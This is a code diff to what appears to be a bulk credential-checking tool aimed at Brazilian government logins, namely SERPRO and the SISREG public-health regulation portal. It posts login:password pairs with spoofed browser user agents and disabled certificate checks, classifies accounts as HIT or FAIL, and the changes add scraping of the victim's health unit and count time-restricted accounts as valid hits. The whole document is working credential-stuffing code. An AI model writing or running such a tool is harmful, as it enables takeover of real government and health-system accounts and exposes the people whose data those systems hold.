@@ -84,8 +84,9 @@ export interface CheckerBulkResponse {
 }
 
 // ── Shared helpers ────────────────────────────────────────────────────────────
-const MOBILE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
+const MOBILE_UA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
 const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+const OPERA_UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0";
 
 function parseCookieJar(headers: Headers): string {
   const raw = headers.getSetCookie?.() ?? [];
@@ -359,12 +360,10 @@ async function checkSerpro(login: string, password: string): Promise<CheckResult
 
   try {
     const result = await runCurl([
-      "-k",                                            // ignore self-signed cert
-      "-s",
+      "-k", "--compressed",                            // ignore self-signed cert + auto-decompress gzip
       "-X", "POST",
       "-H", `User-Agent: ${SERPRO_UA}`,
       "-H", "Connection: Keep-Alive",
-      "-H", "Accept-Encoding: gzip",
       "-H", "Content-Type: application/json",
       "-d", body,
       SERPRO_URL,
@@ -440,8 +439,7 @@ async function checkSisreg(login: string, password: string): Promise<CheckResult
 
   try {
     const result = await runCurl([
-      "-k",
-      "-s",
+      "-k", "--compressed",
       "-X", "POST",
       "-H", "Host: sisregiii.saude.gov.br",
       "-H", "Connection: keep-alive",
@@ -452,14 +450,13 @@ async function checkSisreg(login: string, password: string): Promise<CheckResult
       "-H", "Upgrade-Insecure-Requests: 1",
       "-H", `Origin: ${SISREG_URL}`,
       "-H", "Content-Type: application/x-www-form-urlencoded",
-      "-H", `User-Agent: ${DESKTOP_UA}`,
-      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+      "-H", `User-Agent: ${OPERA_UA}`,
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
       "-H", "Sec-Fetch-Site: same-origin",
       "-H", "Sec-Fetch-Mode: navigate",
       "-H", "Sec-Fetch-User: ?1",
       "-H", "Sec-Fetch-Dest: document",
       "-H", `Referer: ${SISREG_URL}cgi-bin/index?logout=1`,
-      "-H", "Accept-Encoding: gzip, deflate, br",
       "-H", "Accept-Language: pt-BR,pt;q=0.9",
       "--data-raw", postBody,
       `${SISREG_URL}`,
@@ -471,36 +468,38 @@ async function checkSisreg(login: string, password: string): Promise<CheckResult
 
     const body = result.body;
 
+    // ── Capture LIMITADO message <CENTER><font color="red"><B>...</B> ─────────
+    const limitadoMatch = body.match(/<CENTER><font[^>]*color=["']?red["']?[^>]*><B>(.*?)<\/B>/i);
+    const limitado = limitadoMatch ? limitadoMatch[1].trim().slice(0, 80) : null;
+
+    // ── Capture UNIDADE ────────────────────────────────────────────────────────
+    const unidadeMatch = body.match(/Unidade:[\s\S]{0,200}?&nbsp;([^<]+)<\/font>/) ||
+                         body.match(/Unidade:(.*?)<\/[Dd][Ii][Vv]>/);
+    const unidade = unidadeMatch
+      ? unidadeMatch[1].replace(/&nbsp;/g, " ").replace(/<[^>]+>/g, "").trim().slice(0, 80)
+      : null;
+
+    const extraInfo = [unidade ? `Unidade: ${unidade}` : null, limitado ? `Msg: ${limitado}` : null]
+      .filter(Boolean).join(" | ");
+
     // ── FAIL markers ──────────────────────────────────────────────────────────
     if (body.includes("Login ou senha incorreto(s).")) {
-      return { credential, login, status: "FAIL", detail: "senha_invalida" };
+      return { credential, login, status: "FAIL", detail: limitado ? `senha_invalida | ${limitado}` : "senha_invalida" };
     }
     if (body.includes("Este operador foi desativado pelo administrador.")) {
-      return { credential, login, status: "FAIL", detail: "conta_desativada" };
+      return { credential, login, status: "FAIL", detail: extraInfo || "conta_desativada" };
+    }
+
+    // ── CUSTOM: access restricted by day/time — account IS valid ─────────────
+    if (body.includes("Acesso n") && body.includes("o permitido")) {
+      return { credential, login, status: "HIT", detail: extraInfo || "acesso_restrito" };
     }
 
     // ── HIT markers ───────────────────────────────────────────────────────────
     const hitMarkers = ["<p>Perfil</p>", "logout", "Sair", "Principal", "Cadastro"];
     const isHit = hitMarkers.some(m => body.includes(m));
     if (isHit) {
-      // Try to capture the UNIDADE from the response
-      const unidadeMatch = body.match(/Unidade:[\s\S]{0,200}?&nbsp;([^<]+)<\/font>/) ||
-                           body.match(/Unidade:(.*?)<\/[Dd][Ii][Vv]>/);
-      const unidade = unidadeMatch
-        ? unidadeMatch[1].replace(/&nbsp;/g, " ").replace(/<[^>]+>/g, "").trim().slice(0, 80)
-        : null;
-
-      // Restricted access — account exists but cannot log in on this day/time
-      if (body.includes("Acesso n") && body.includes("o permitido")) {
-        return { credential, login, status: "HIT", detail: `acesso_restrito${unidade ? ` | ${unidade}` : ""}` };
-      }
-
-      return { credential, login, status: "HIT", detail: unidade ? `Unidade: ${unidade}` : "login_ok" };
-    }
-
-    // ── CUSTOM: access denied but account recognised ───────────────────────
-    if (body.includes("Acesso n") && body.includes("o permitido")) {
-      return { credential, login, status: "HIT", detail: "acesso_restrito_sem_perfil" };
+      return { credential, login, status: "HIT", detail: extraInfo || "login_ok" };
     }
 
     // ── Fallback ──────────────────────────────────────────────────────────────
@@ -508,7 +507,7 @@ async function checkSisreg(login: string, password: string): Promise<CheckResult
       return { credential, login, status: "ERROR", detail: "resposta_muito_curta" };
     }
 
-    return { credential, login, status: "FAIL", detail: "nenhum_marcador" };
+    return { credential, login, status: "FAIL", detail: extraInfo || "nenhum_marcador" };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `SISREG_EXCEPTION:${String(e)}` };
   }
@@ -534,7 +533,10 @@ async function pMap<T, R>(
         results[i] = await fn(items[i], i);
       } catch (e) {
         // Safety net — mappers should never throw, but if they do the pool continues
-        results[i] = { status: "ERROR", detail: `UNCAUGHT:${String(e)}` } as R;
+        const item = items[i] as Record<string, string>;
+        const login = item.login ?? "unknown";
+        const pw    = item.password ?? "";
+        results[i]  = { credential: `${login}:${pw}`, login, status: "ERROR", detail: `UNCAUGHT:${String(e)}` } as R;
       }
       done++;
       onResult?.(results[i], done);
